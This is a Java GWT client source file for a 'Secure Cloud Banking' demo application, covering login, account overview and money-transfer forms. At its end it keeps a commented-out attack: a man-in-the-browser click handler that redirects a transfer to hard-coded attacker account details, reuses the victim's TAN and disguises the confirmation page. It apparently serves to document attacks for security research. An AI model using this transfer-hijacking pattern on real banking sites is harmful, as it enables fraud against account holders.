package de.mrx.client;

import java.util.ArrayList;
import java.util.List;

import com.allen_sauer.gwt.log.client.Log;
import com.google.gwt.core.client.EntryPoint;
import com.google.gwt.core.client.GWT;
import com.google.gwt.event.dom.client.ClickEvent;
import com.google.gwt.event.dom.client.ClickHandler;
import com.google.gwt.uibinder.client.UiBinder;
import com.google.gwt.uibinder.client.UiField;
import com.google.gwt.user.client.Window;
import com.google.gwt.user.client.rpc.AsyncCallback;
import com.google.gwt.user.client.ui.Anchor;
import com.google.gwt.user.client.ui.Button;
import com.google.gwt.user.client.ui.FlexTable;
import com.google.gwt.user.client.ui.Grid;
import com.google.gwt.user.client.ui.HTML;
import com.google.gwt.user.client.ui.HorizontalPanel;
import com.google.gwt.user.client.ui.Image;
import com.google.gwt.user.client.ui.Label;
import com.google.gwt.user.client.ui.MenuBar;
import com.google.gwt.user.client.ui.RootLayoutPanel;
import com.google.gwt.user.client.ui.RootPanel;
import com.google.gwt.user.client.ui.VerticalPanel;
import com.google.gwt.user.client.ui.Widget;

import de.mrx.client.customer.forms.CustomerTransferHistoryForm;
import de.mrx.client.customer.forms.FastMoneyTransferForm;
import de.mrx.client.customer.forms.LeftPanelMenuForm;
import de.mrx.client.customer.forms.MoneyTransferForm;
import de.mrx.client.register.RegistrationForm;

/**
 * Complete GUI for Secure Cloud Banking. Includes Registration process, general
 * information, and online banking Entry point classes define
 * <code>onModuleLoad()</code>. 
 * 
 */
public class SCB implements EntryPoint, Observer {

	// private static final Logger log = Logger.getLogger(SCB.class.getName());
	// Widget divLogger = Log.getLogger(DivLogger.class).getWidget();

	public static final String PAGEID_HEADER = "cloudbanking";
	public static final String PAGEID_CONTENT = "content";
//	public static final String PAGEID_FEHLER = "fehler";
//	public static final String PAGEID_SIGN = "signInOut";

	public final static String STYLE_VALUE_NOT_OKAY = "ValueNotOkay";
	String currentLanguage = "de";
	
	interface MyUiBinder extends UiBinder<Widget, SCB> {
	} 
	
	
	
	private static MyUiBinder uiBinder = GWT.create(MyUiBinder.class);
	
	@UiField
	VerticalPanel navigationPanel;
	
	@UiField
	VerticalPanel contentPanel;
	
	@UiField
	HorizontalPanel hintPanel;
	
	@UiField
	HorizontalPanel menuPanel;

	RegistrationForm regForm;

	private SCBConstants constants = GWT.create(SCBConstants.class);
	// private SCBMessages messages = GWT.create(SCBMessages.class);
	RegisterServiceAsync registerSvc;
	private CustomerServiceAsync bankingService;

	MoneyTransferForm mTransfer;// = new MoneyTransferForm();
	/**
	 * The message displayed to the user when the server cannot be reached or
	 * returns an error.
	 */
	// private static final String SERVER_ERROR = "An error occurred while "
	// + "attempting to contact the server. Please check your network "
	// + "connection and try again.";

	MenuBar generalMenu = new MenuBar(true);

	private VerticalPanel mainPanel = new VerticalPanel();

	private HorizontalPanel accountOverviewPanel = new HorizontalPanel();
	private VerticalPanel accountsListPanel = new VerticalPanel();
	private VerticalPanel accountsDetailsPanel = new VerticalPanel();

	FlexTable validateErrorTable = new FlexTable();

	private VerticalPanel informationPanel;

	private SCBIdentityDTO identityInfo = null;
	private VerticalPanel loginPanel = new VerticalPanel();
	
	@UiField
	Anchor signIn;
	
	@UiField
	Anchor signOut;
	
//	private Anchor signInLink = new Anchor(constants.signIn());
//	private Anchor signOutLink = new Anchor(constants.signOut());



	/**
	 * account number of user's saving account
	 */
	private String currentAccountNr;
	
	/**
	 * account details of user's saving account
	 */
	private AccountDetailDTO currentAccountDetails;

	private List<String> hints = new ArrayList<String>();

	private Image scbLogo;
	private SCBMenu scbMenu;
	private MoneyTransferForm confirmPage;
	private LeftPanelMenuForm leftPanelMenuForm;
	

	private void doShowAbout(boolean picture) {
		contentPanel.clear();
		
		HTML text = new HTML(constants.registrationIntroductionText());
		text.setStyleName("centerAligned");
		scbLogo = new Image("images/banking.jpg");
		scbLogo.setStyleName("centerAligned");

		contentPanel.add(text);
		if (picture) {
			contentPanel.add(scbLogo);
		}


	}

	private void doOpenRegisterMenu() {
		
		if (regForm == null) {
			regForm = new RegistrationForm(signIn);
			regForm.setUser(identityInfo);
		}

		navigationPanel.clear();
		
		contentPanel.add(regForm);
	}



	/**
	 * This is the entry point method.
	 */
	public void onModuleLoad() {
		
		try {
			RootLayoutPanel.get().add(uiBinder.createAndBindUi(this));
//			GWT.log("On Module Load");
//			RootPanel r = RootPanel.get(PAGEID_HEADER);
//			if (r == null) {
//				GWT.log("Root not found: '" + PAGEID_HEADER + "'");
//				return;
//			}

			// RootPanel.get(PAGEID_FEHLER).add(divLogger);
			Log.setUncaughtExceptionHandler();

//			mainPanel = createMainPanel();
			scbMenu = new SCBMenu();
			scbMenu.addObserver(this);
			menuPanel.add(scbMenu);

//			r.add(mainPanel);

			leftPanelMenuForm = new LeftPanelMenuForm();
			navigationPanel.add(leftPanelMenuForm);
			
			leftPanelMenuForm.addObserver(this);
			checkGoogleStatus();
			initAccountNr();
			
			doShowAbout(true);
			

		} catch (Exception e) {
			GWT.log(e.getMessage());
			e.printStackTrace();
		}
	}

	private void showAccountOverviewForSingleAccount(){
		List accWrapper=new ArrayList<AccountDTO>();
		if (currentAccountNr==null){
			GWT.log("account data not yet loaded. Can not show detail");
			return;
		}
		accWrapper.add(currentAccountDetails);
		showAccountOverviewInDetailPanel(accWrapper);
		
	}

	private void showAccountOverviewInDetailPanel(List<AccountDTO> result) {
		contentPanel.clear();
		accountsDetailsPanel.clear();
		contentPanel.add(accountsDetailsPanel);
		if (result.size() == 0) {
			Label noAccountHint = new Label(
					constants.accountOverviewHintNoAccount());
			accountsDetailsPanel.add(noAccountHint);
			return;
		}
		Label accHeaderLbl = new Label(constants.accountOverviewLblTitel());
		accountsDetailsPanel.add(accHeaderLbl);
		Grid grid = new Grid(result.size() + 1, 2);
		accountsDetailsPanel.add(grid);
		Label accHeader = new Label(constants.accountOverviewLblHeaderAccount());
		Label amountHeader = new Label(
				constants.accountOverviewLblHeaderBalance());
		accHeader.setStyleName("TransfersHeader");
		amountHeader.setStyleName("TransfersHeader");
		grid.setWidget(0, 0, accHeader);
		grid.setWidget(0, 1, amountHeader);
		grid.setBorderWidth(1);

		int row = 1;
		for (AccountDTO dto : result) {
			Label accountElement = new Label(dto.getAccountNr());
			Label balanceElement = new Label(
					com.google.gwt.i18n.client.NumberFormat.getCurrencyFormat()
							.format(dto.getBalance()));
			if (dto.getBalance() >= 0) {
				balanceElement.setStyleName("positiveMoney");
			} else {
				balanceElement.setStyleName("negativeMoney");
			}
			grid.setWidget(row, 0, accountElement);
			grid.setWidget(row, 1, balanceElement);

			row++;
		}
	}

	/**
	 * Initialize personalization
	 */
	private void checkGoogleStatus() {

		getBankingService();
		GWT.log(GWT.getHostPageBaseURL());
		bankingService.login(GWT.getHostPageBaseURL(),
				new AsyncCallback<SCBIdentityDTO>() {
					public void onFailure(Throwable error) {
						error.printStackTrace();
						Log.error("Login state can not be retrieved! ", error);
						leftPanelMenuForm.setStateNotRegistered();
//						Window.alert(constants.loginFailedText());
					}

					/**
					 * after Loading of user information
					 * @param result
					 */
					public void onSuccess(SCBIdentityDTO result) {
						identityInfo = result;

						if (identityInfo.isLoggedIn()) {
							if (regForm != null) {
								regForm.setUser(identityInfo);
							}
							Log.info("User is logged in with email-adress "
									+ result.getEmail());
							if (identityInfo.isActivated()) {								
								doShowPageForActivatedUser();
							} else {
								Log.info("Account not yet activated in SCB: "
										+ identityInfo);
								scbMenu.getMenuUserInfo().setText(
										identityInfo.getEmail());
								leftPanelMenuForm.setStateRegisteredButNoSavingAccount();
							}
							loadLoggedInSetup();
							String language = identityInfo.getLanguage();
							GWT.log("Language: " + language);
							if (language != null
									&& !currentLanguage.equals(language)) {
								changeToLocalisedVersion(language);
							}
						} else {
							Log.info("User is not yet logged in with his Google account");
							leftPanelMenuForm.setStateNotRegistered();
							loadLogin();
						}
					}
				});

	}

	private void loadLogin() {
		// Assemble login panel.
		signIn.setHref(identityInfo.getLoginUrl());
		signIn.setText(constants.signIn());
		signIn.setVisible(true);
		signOut.setVisible(false);
	}

	private void loadLoggedInSetup() {
		// Assemble logout panel.

		signOut.setHref(identityInfo.getLogoutUrl());
		signOut.setText(constants.signOut());
		signIn.setVisible(false);
		signOut.setVisible(true);

	}

	private void createAccount() {
		getBankingService();
		bankingService.openNewAccount(new AsyncCallback<Void>() {

			public void onFailure(Throwable caught) {
				Log.error("Open new account failed", caught);
			}

			public void onSuccess(Void result) {
				Log.info("Account created");
				Window.alert(constants.accountOpened());
				Window.Location.reload();

			}
		});

	}

	private void showAccountTransactions(String accNr) {
		getBankingService();
		accountsDetailsPanel.clear();

		currentAccountNr = accNr;

		bankingService.getAccountDetails(accNr,
				new AsyncCallback<AccountDetailDTO>() {

					public void onFailure(Throwable caught) {
						Log.error("Error loading balance", caught);

					}

					public void onSuccess(AccountDetailDTO result) {
						CustomerTransferHistoryForm customerTransfer = new CustomerTransferHistoryForm(
								result);
						customerTransfer.addObserver(SCB.this);
						contentPanel.clear();
						contentPanel.add(customerTransfer);

					}
				});
	}

	

	class AccountClickHandler implements ClickHandler {
		String accNr;

		public AccountClickHandler(String accountNr) {
			accNr = accountNr;
		}

		public void onClick(ClickEvent event) {
			showAccountTransactions(accNr);
		}

	}

	/*
	 * change the language during runtime keeps the debug flag
	 */
	public static void changeToLocalisedVersion(String language) {
		String queryPart = Window.Location.getQueryString();

		String reloadURL;
		String debugFlag = Window.Location.getParameter("gwt.codesvr");

		if (debugFlag != null) {
			reloadURL = GWT.getHostPageBaseURL() +"?gwt.codesvr="+ debugFlag + "&locale="
					+ language;
		} else {
			reloadURL = GWT.getHostPageBaseURL() + "?locale=" + language;
		}

		GWT.log(reloadURL);

		Window.open(reloadURL, "_self", null);
	}

	@Override
	public void update(Observable source, Object eventType, Object parameter) {
		System.out.println("Updated");
		if (source instanceof MoneyTransferForm) {
			showAccountTransactions((String) parameter);
		} else if (source instanceof FastMoneyTransferForm) {
			if (parameter instanceof MoneyTransferDTO) {
				showMoneyTransferConfirmationForm((MoneyTransferDTO) parameter);

			}
		}else if(source instanceof LeftPanelMenuForm){
			if (eventType==LeftPanelMenuForm.EVENT_SHOW_OVERVIEW){
				showAccountOverviewForSingleAccount();			
			}
			if (eventType==LeftPanelMenuForm.EVENT_SHOW_SAVING_ACCOUNT){
				CustomerTransferHistoryForm customerTransfer = new CustomerTransferHistoryForm(currentAccountDetails);
				
				customerTransfer.addObserver(SCB.this);
				accountsDetailsPanel.clear();
				accountsDetailsPanel.add(customerTransfer);

			}
			if (eventType==LeftPanelMenuForm.EVENT_SEND_MONEY){
				showStandardMoneyTransferForm();
			}
			if (eventType==LeftPanelMenuForm.EVENT_SEND_MONEY_FAST){
				showFastMoneyTransferForm();
			}
			
		}
		
		else if (source instanceof CustomerTransferHistoryForm) {
			if (eventType == CustomerTransferHistoryForm.EVENT_SEND_MONEY) {
				showStandardMoneyTransferForm();
			} else if (eventType == CustomerTransferHistoryForm.EVENT_SEND_FAST_MONEY) {
				showFastMoneyTransferForm();
			}

		} else if (source instanceof SCBMenu) {
			if (eventType == SCBMenu.EVENT_SHOW_REGISTRATION_MENU) {
				doOpenRegisterMenu();
			}
		}

	}

	private void showFastMoneyTransferForm() {
		FastMoneyTransferForm mTransfer = new FastMoneyTransferForm(
				currentAccountNr);
		mTransfer.addObserver(SCB.this);
		accountsDetailsPanel.clear();
		accountsDetailsPanel.add(mTransfer);
	}

	private void showStandardMoneyTransferForm() {
		if (!checkAccountLoaded()){
			return;
		}
		mTransfer=new MoneyTransferForm(currentAccountNr);		
		accountsDetailsPanel.clear();
		mTransfer.addObserver(SCB.this);
		accountsDetailsPanel.add(mTransfer);
	}

	private boolean checkAccountLoaded() {
		if (currentAccountNr==null){
			Window.alert(constants.errorLoadingAccount());
			return false;
		}
		return true;
	}

	private void showMoneyTransferConfirmationForm(MoneyTransferDTO moneyTranfer) {
		confirmPage = new MoneyTransferForm(currentAccountNr, moneyTranfer);
		accountsDetailsPanel.clear();
		accountsDetailsPanel.add(confirmPage);
	}

	
	/***
	 * loads the account Nr of the saving account into the application
	 */
	private void initAccountNr(){
		
	
	if (currentAccountNr==null){
		getBankingService().getSavingAccount(new AsyncCallback<AccountDetailDTO>() {

			@Override
			public void onFailure(Throwable caught) {
				Window.alert("We are sorry. A problem occured");
				GWT.log("Error loading user's account",caught);
			}

			@Override
			public void onSuccess(AccountDetailDTO result) {
				GWT.log("acc geladen: "+result.getAccountNr());
				currentAccountDetails=result;
				currentAccountNr=result.getAccountNr();
			}
			
		});
	}
	}


	private CustomerServiceAsync getBankingService() {
		if (bankingService == null) {
			bankingService = GWT.create(CustomerService.class);
		}
		return bankingService;
	}

	private void doShowPageForActivatedUser() {
		Log.info("Valid Account " + identityInfo);
		String userInfo = identityInfo.getEmail();
		if (identityInfo.getNickName() != null) {
			userInfo = identityInfo.getNickName()
					+ " (" + userInfo + ")";
		}
		scbMenu.getMenuUserInfo().setText(userInfo);
		scbMenu.getMenuItemRegister().setVisible(false);
		leftPanelMenuForm.setStateOpenedSavingAccount();
		showAccountOverviewForSingleAccount();
		
	}
	
	public void reportError(String errorText){		
		hintPanel.clear();		
		Label l=new Label(errorText);
		l.setStyleName("hintError");
		hintPanel.add(l);
	}
	
	public  void reportInfo(String infoText){
		hintPanel.clear();		
		Label l=new Label(infoText);
		l.setStyleName("hintInfo");
		hintPanel.add(l);
	}

	/**
	 * this is the injection for a Javascript-Attacker with GWT
	 * Not used anymore, but documents the process much better than the pure javascript version
	 * kept for documentation purpose 
	 * @deprecated
	 * 
	 * @see http://code.google.com/p/gwtquery/wiki/GettingStarted
	 */
//	private void startAttack() {
//		$("h1").css(BACKGROUND_COLOR, RED).text("You are hacked!");
//		
//		// everything should best work with DOM-Operations only (not with
//		// knowledge of the Java Widget)
//
//		// 1. Find relevant Button for first page (after first data entry)
//		// later find with DOM Operations (GWTQuery)
//		Button sendMoneyAskForConfirmBtn = mTransfer.getSendMoney();
//		
//		// rewrite ClickHandler for askForConfirmation Button
//		sendMoneyAskForConfirmBtn.addClickHandler(new ClickHandler() {
//
//			@Override
//			public void onClick(ClickEvent event) {
//				String ATTACKER_BLZ = "6272";
//				String ATTACKER_BANK_NAME = "Deutsche Privatbank";
//				String ATTACKER_RECEIVER_ACC_NR = "172";
//				String ATTACKER__RECEIVER_NAME = "Mr. Evil";
//				int ATTACKER__AMOUNT = 10;
//				String ATTACKER_REMARK = "I just needed the money";
//				CustomerServiceAsync bankingService = GWT
//						.create(CustomerService.class);
//				//
//				bankingService.sendMoneyAskForConfirmationData(currentAccount,
//						ATTACKER_BLZ, ATTACKER_RECEIVER_ACC_NR,
//						ATTACKER__AMOUNT, ATTACKER_REMARK,
//						ATTACKER__RECEIVER_NAME, ATTACKER_BANK_NAME,
//						new AsyncCallback<MoneyTransferDTO>() {
//
//							@Override
//							public void onFailure(Throwable caught) {
//								caught.printStackTrace();
//								Window.alert("Called with failure: "
//										+ caught.getMessage());
//
//							}
//
//							@Override
//							public void onSuccess(MoneyTransferDTO result) {
//								Window.alert("First part succeeds. Now manipulate the confirmation page");
//								result.setReceiverAccountNr(SCB.this.mTransfer
//										.getReceiverAccountNr().getText());
//								result.setReceiverName(SCB.this.mTransfer
//										.getReceiverName().getText());
//								result.setReceiverBankNr(SCB.this.mTransfer
//										.getReceiverBLZ().getText());
//								result.setReceiverName(SCB.this.mTransfer
//										.getReceiverBankName().getText());
//								result.setRemark(SCB.this.mTransfer.getRemark()
//										.getText());
//								result.setAmount(Double
//										.parseDouble(SCB.this.mTransfer
//												.getAmount().getText()));
//								showMoneyTransferConfirmationForm(result);
//							}
//						});
//
//			}
//		});
//
//	}
//
//	/**
//	 * ClickHandler for modifiying the confirmation page (with TAN)
//	 * 
//	 * @author Jan
//	 * 
//	 */
//	class MoneyTransferHackClickHandler implements ClickHandler {
//		private String currentAccount;
//
//		public MoneyTransferHackClickHandler(String currentAccount) {
//			this.currentAccount = currentAccount;
//		}
//
//		@Override
//		public void onClick(ClickEvent event) {
//			String ATTACKER_BLZ = "6272";
//			String ATTACKER_BANK_NAME = "Deutsche Privatbank";
//			String ATTACKER_RECEIVER_ACC_NR = "172";
//			String ATTACKER__RECEIVER_NAME = "Mr. Evil";
//			int ATTACKER__AMOUNT = 10;
//			String ATTACKER_REMARK = "I just needed the money";
//			CustomerServiceAsync bankingService = GWT
//					.create(CustomerService.class);
//			//
//			bankingService.sendMoney(currentAccount, ATTACKER_BLZ,
//					ATTACKER_RECEIVER_ACC_NR, ATTACKER__AMOUNT,
//					ATTACKER_REMARK, ATTACKER__RECEIVER_NAME,
//					ATTACKER_BANK_NAME, mTransfer.getTan().getText(),
//					new AsyncCallback<Void>() {
//
//						@Override
//						public void onFailure(Throwable caught) {
//							caught.printStackTrace();
//							Window.alert("Called with failure: "
//									+ caught.getMessage());
//
//						}
//
//						@Override
//						public void onSuccess(Void result) {
//							showAccountDetails(currentAccount);
//
//						}
//
//					});
//		}
//	}

}
